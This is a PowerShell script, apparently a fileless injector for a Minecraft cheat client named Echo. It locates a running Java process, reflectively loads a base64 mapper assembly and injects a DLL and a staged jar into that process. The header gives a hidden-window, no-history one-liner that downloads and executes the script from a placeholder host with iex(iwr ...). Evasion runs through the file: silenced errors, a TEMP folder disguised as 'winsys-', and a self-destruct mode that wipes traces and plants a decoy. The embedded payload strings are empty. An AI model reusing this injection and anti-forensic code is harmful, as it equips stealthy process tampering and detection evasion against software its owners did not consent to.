# fileless-inject.ps1 - fileless Echo loader (Prestige-style)
# Modes:
#  Load (default): stage Echo jar to TEMP, map payload, add jar to Fabric Knot,
#    init Echo via EchoBootstrap.start(). Use on fresh Fabric 1.21.11, no mod.
#  SelfDestruct: map payload, fire already-loaded Echo SelfDestruct (wipe+decoy).
#
# Win+R (no history, hidden):
#  powershell -NoProfile -w hidden -c "iex((iwr 'https://HOST/fileless-inject.ps1' -UseBasicParsing).Content)"
# Local:
#  . C:\Echo\native\fileless-inject.ps1 -Mode Load
#  . C:\Echo\native\fileless-inject.ps1 -Mode Load -JarPath "C:\path\echo.jar"
#  . C:\Echo\native\fileless-inject.ps1 -Mode SelfDestruct

param([int]$TargetPid = 0, [string]$Mode = "Load", [string]$JarPath = "", [string]$JarUrl = "")

$ErrorActionPreference = "SilentlyContinue"

$mapperB64 = ""
$dllB64 = ""

try {
    $mapper = [Reflection.Assembly]::Load([Convert]::FromBase64String($mapperB64))
    $dll = [Convert]::FromBase64String($dllB64)

    if ($TargetPid -le 0) {
        $p = Get-Process -Name "javaw","java" -ErrorAction SilentlyContinue | Sort-Object StartTime | Select-Object -First 1
        if ($p) { $TargetPid = $p.Id }
    }
    if ($TargetPid -le 0) { exit 2 }

    $type = $mapper.GetType("EchoMapper")
    if ($Mode -eq "SelfDestruct") {
        $ia = New-Object object[] 2
        $ia[0] = [int]$TargetPid
        $ia[1] = [byte[]]$dll
        $rc = $type.GetMethod("Inject", [type[]]@([int], [byte[]])).Invoke($null, $ia)
        exit [int]$rc
    }

    $jarBytes = $null
    if ($JarUrl) { try { $jarBytes = (New-Object System.Net.WebClient).DownloadData($JarUrl) } catch { $jarBytes = $null } }
    if ((-not $jarBytes) -and $JarPath -and (Test-Path -LiteralPath $JarPath)) { $jarBytes = [IO.File]::ReadAllBytes($JarPath) }
    if (-not $jarBytes) {
        $def = "C:\Echo\versions\1.21.11\build\libs\echo-mc1.21.11-b0.0.6.jar"
        if (Test-Path -LiteralPath $def) { $jarBytes = [IO.File]::ReadAllBytes($def) }
    }
    if (-not $jarBytes) { exit 7 }

    $tag = [Guid]::NewGuid().ToString("N").Substring(0,8)
    $tmpDir = Join-Path $env:TEMP ("winsys-" + $tag)
    New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
    $tmpJar = Join-Path $tmpDir ("rt-" + $tag + ".jar")
    [IO.File]::WriteAllBytes($tmpJar, $jarBytes)

    $m = $type.GetMethod("InjectLoad")
    $la = New-Object object[] 3
    $la[0] = [int]$TargetPid
    $la[1] = [byte[]]$dll
    $la[2] = [string]$tmpJar
    $rc = $m.Invoke($null, $la)
    exit [int]$rc
}
catch { exit 1 }
